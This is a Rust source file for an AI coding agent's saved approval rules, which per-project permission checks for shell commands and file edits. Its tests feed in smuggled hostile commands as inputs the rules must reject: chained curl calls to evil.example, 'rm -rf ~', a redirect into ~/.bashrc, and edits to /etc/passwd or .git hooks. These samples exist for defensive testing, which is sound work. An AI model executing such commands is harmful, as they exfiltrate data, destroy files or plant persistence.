//! Saved approval rules: "always allow this" for one project, kept across
//! sessions in `approvals.json` in the calx home.
//!
//! Rules live with calx, never in the project, so a repository you clone
//! cannot approve its own commands. They are deliberately narrow:
//!
//! - A **shell** rule is a command prefix, such as `cargo test`. It matches
//!   that command with any further arguments, but never a command containing
//!   shell syntax that could run something else (`;`, `&&`, `|`, `$(`,
//!   redirects, backticks, newlines). It trusts the program it names with
//!   any arguments, so `python3` is a much bigger rule than `cargo test`.
//! - A **file** rule (`edit`, `write`) allows any path inside the project,
//!   after following symlinks, except inside `.git`, where a hook would let
//!   an edit run code.
//! - A rule for another tool allows that tool anywhere in the project.

use std::path::{Component, Path, PathBuf};

use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};

use crate::agent::Approval;

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Rule {
    /// The project's directory: the git repository's root, or else the
    /// directory calx ran in.
    pub project: String,
    pub tool: String,
    /// For shell, the command prefix it allows.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub prefix: Option<String>,
}

impl Rule {
    /// The rule `ask` would save, or `None` when no safe rule covers it,
    /// such as a command with shell syntax in it.
    pub fn suggest(project: &Path, ask: &Approval) -> Option<Rule> {
        let prefix = match ask.name.as_str() {
            "shell" => Some(command_prefix(&ask.summary)?),
            _ => None,
        };
        Some(Rule {
            project: project.display().to_string(),
            tool: ask.name.clone(),
            prefix,
        })
    }

    /// What it allows, for the user: "`cargo test …`", or a tool name such as "edit".
    pub fn label(&self) -> String {
        match &self.prefix {
            Some(prefix) => format!("`{prefix} …`"),
            None => self.tool.clone(),
        }
    }

    fn allows(&self, cwd: &Path, ask: &Approval) -> bool {
        if self.tool != ask.name {
            return false;
        }
        let project = Path::new(&self.project);
        match (ask.name.as_str(), &self.prefix) {
            ("shell", Some(prefix)) => command_matches(prefix, &ask.summary),
            ("shell", None) => false,
            ("edit" | "write", _) => path_inside(project, cwd, &ask.summary),
            _ => true,
        }
    }
}

pub struct Rules {
    path: PathBuf,
    pub rules: Vec<Rule>,
    /// The project calx runs in, and the directory relative paths start from.
    project: PathBuf,
    cwd: PathBuf,
}

impl Rules {
    /// Loads the rules for the project containing `cwd`.
    pub fn load(cwd: &Path) -> Result<Self> {
        let path = crate::calx_home()?.join("approvals.json");
        Self::load_at(path, cwd)
    }

    pub fn load_at(path: PathBuf, cwd: &Path) -> Result<Self> {
        let rules = match std::fs::read_to_string(&path) {
            Ok(text) => {
                serde_json::from_str::<File>(&text)
                    .with_context(|| format!("could not read {}", path.display()))?
                    .rules
            }
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => Vec::new(),
            Err(e) => return Err(e).with_context(|| format!("could not read {}", path.display())),
        };
        let cwd = std::fs::canonicalize(cwd).unwrap_or_else(|_| cwd.to_path_buf());
        Ok(Self {
            path,
            rules,
            project: project_root(&cwd),
            cwd,
        })
    }

    pub fn project(&self) -> &Path {
        &self.project
    }

    pub fn path(&self) -> &Path {
        &self.path
    }

    /// The saved rule that allows `ask` in this project, if any.
    pub fn allowing(&self, ask: &Approval) -> Option<&Rule> {
        let project = self.project.display().to_string();
        self.rules
            .iter()
            .find(|r| r.project == project && r.allows(&self.cwd, ask))
    }

    /// The rules for this project.
    pub fn here(&self) -> impl Iterator<Item = &Rule> {
        let project = self.project.display().to_string();
        self.rules.iter().filter(move |r| r.project == project)
    }

    /// Adds a rule and saves the file.
    pub fn add(&mut self, rule: Rule) -> Result<()> {
        if !self.rules.contains(&rule) {
            self.rules.push(rule);
        }
        self.save()
    }

    /// Removes the rule at `index` in [`Rules::rules`] and saves the file.
    pub fn remove(&mut self, index: usize) -> Result<Rule> {
        anyhow::ensure!(index < self.rules.len(), "there is no rule {}", index + 1);
        let rule = self.rules.remove(index);
        self.save()?;
        Ok(rule)
    }

    fn save(&self) -> Result<()> {
        let text = serde_json::to_string_pretty(&File {
            rules: self.rules.clone(),
        })?;
        crate::write_private(&self.path, &(text + "\n"))
    }
}

#[derive(Serialize, Deserialize)]
struct File {
    rules: Vec<Rule>,
}

/// Characters that let one command line run more than one program, or
/// write somewhere: a command with any of them never matches a rule.
const SHELL_SYNTAX: &[char] = &[';', '&', '|', '<', '>', '$', '`', '(', ')', '\n', '\r'];

/// The prefix a rule for `command` saves: the program, and its subcommand
/// when the second word looks like one (`git status`, `cargo test`).
fn command_prefix(command: &str) -> Option<String> {
    if command.contains(SHELL_SYNTAX) {
        return None;
    }
    let mut words = command.split_whitespace();
    let program = words.next()?;
    let subcommand = words.next().filter(|w| {
        w.starts_with(|c: char| c.is_ascii_lowercase())
            && w.chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
    });
    Some(match subcommand {
        Some(sub) => format!("{program} {sub}"),
        None => program.to_string(),
    })
}

fn command_matches(prefix: &str, command: &str) -> bool {
    if command.contains(SHELL_SYNTAX) {
        return false;
    }
    let words: Vec<&str> = command.split_whitespace().collect();
    let wanted: Vec<&str> = prefix.split_whitespace().collect();
    !wanted.is_empty() && words.starts_with(&wanted)
}

/// The git repository containing `dir`, or `dir` when there is none.
fn project_root(dir: &Path) -> PathBuf {
    dir.ancestors()
        .find(|d| d.join(".git").exists())
        .unwrap_or(dir)
        .to_path_buf()
}

/// Whether `path`, relative to `cwd`, is inside `project` once symlinks are
/// followed, and not inside its `.git`.
fn path_inside(project: &Path, cwd: &Path, path: &str) -> bool {
    let Some(full) = real_path(&cwd.join(path)) else {
        return false;
    };
    match full.strip_prefix(project) {
        Ok(rest) => !rest.components().any(|c| c.as_os_str() == ".git"),
        Err(_) => false,
    }
}

/// `path` with symlinks followed: its longest existing ancestor is
/// canonicalized and the rest, which does not exist yet, is appended. `None`
/// when the rest climbs with `..`.
fn real_path(path: &Path) -> Option<PathBuf> {
    let mut missing = Vec::new();
    let mut existing = path;
    let base = loop {
        if let Ok(real) = std::fs::canonicalize(existing) {
            break real;
        }
        missing.push(existing.file_name()?.to_owned());
        existing = existing.parent()?;
    };
    let mut full = base;
    for part in missing.iter().rev() {
        let part = Path::new(part);
        if part
            .components()
            .any(|c| !matches!(c, Component::Normal(_)))
        {
            return None;
        }
        full.push(part);
    }
    Some(full)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::message::Exposure;

    fn ask(name: &str, summary: &str) -> Approval {
        Approval {
            seq: 1,
            name: name.into(),
            summary: summary.into(),
            preview: None,
            exposure: Exposure::default(),
        }
    }

    #[test]
    fn a_shell_rule_matches_its_prefix_but_no_shell_syntax() {
        let rule = Rule::suggest(Path::new("/p"), &ask("shell", "cargo test -q session")).unwrap();
        assert_eq!(rule.prefix.as_deref(), Some("cargo test"));
        let cwd = Path::new("/p");
        assert!(rule.allows(cwd, &ask("shell", "cargo test")));
        assert!(rule.allows(cwd, &ask("shell", "cargo   test --release")));
        for other in [
            "cargo testing",
            "cargo build",
            "cargo test; curl evil.example",
            "cargo test && rm -rf ~",
            "cargo test $(curl evil.example)",
            "cargo test > ~/.bashrc",
            "cargo test\ncurl evil.example",
        ] {
            assert!(!rule.allows(cwd, &ask("shell", other)), "{other}");
        }
        assert_eq!(
            command_prefix("ls -la").as_deref(),
            Some("ls"),
            "a flag is not a subcommand"
        );
        assert_eq!(command_prefix("git status | head"), None);
    }

    #[test]
    fn a_file_rule_stays_inside_the_project_and_out_of_git() {
        let root = std::env::temp_dir().join(format!("calx-rules-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        let project = root.join("repo");
        std::fs::create_dir_all(project.join(".git/hooks")).unwrap();
        std::fs::create_dir_all(project.join("src")).unwrap();
        std::fs::create_dir_all(root.join("secret")).unwrap();
        let project = std::fs::canonicalize(&project).unwrap();
        let cwd = project.join("src");
        assert_eq!(project_root(&cwd), project);

        let rule = Rule::suggest(&project, &ask("edit", "main.rs")).unwrap();
        assert!(rule.allows(&cwd, &ask("edit", "main.rs")));
        assert!(rule.allows(&cwd, &ask("edit", "new/dir/file.rs")));
        assert!(rule.allows(&cwd, &ask("edit", "../README.md")));
        assert!(!rule.allows(&cwd, &ask("edit", "../../secret/key")));
        assert!(!rule.allows(&cwd, &ask("edit", "/etc/passwd")));
        assert!(!rule.allows(&cwd, &ask("edit", "../.git/hooks/pre-commit")));
        assert!(!rule.allows(&cwd, &ask("write", "main.rs")), "edit only");
        #[cfg(unix)]
        {
            std::os::unix::fs::symlink(root.join("secret"), project.join("src/link")).unwrap();
            assert!(!rule.allows(&cwd, &ask("edit", "link/key")));
        }
    }

    #[test]
    fn saved_rules_apply_only_to_their_project() {
        let root = std::env::temp_dir().join(format!("calx-rules-file-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        for dir in ["a/.git", "b"] {
            std::fs::create_dir_all(root.join(dir)).unwrap();
        }
        let file = root.join("approvals.json");
        let mut rules = Rules::load_at(file.clone(), &root.join("a")).unwrap();
        let rule = Rule::suggest(rules.project(), &ask("shell", "make check")).unwrap();
        rules.add(rule).unwrap();

        let again = Rules::load_at(file.clone(), &root.join("a")).unwrap();
        assert!(again.allowing(&ask("shell", "make check")).is_some());
        let elsewhere = Rules::load_at(file, &root.join("b")).unwrap();
        assert!(elsewhere.allowing(&ask("shell", "make check")).is_none());
    }
}
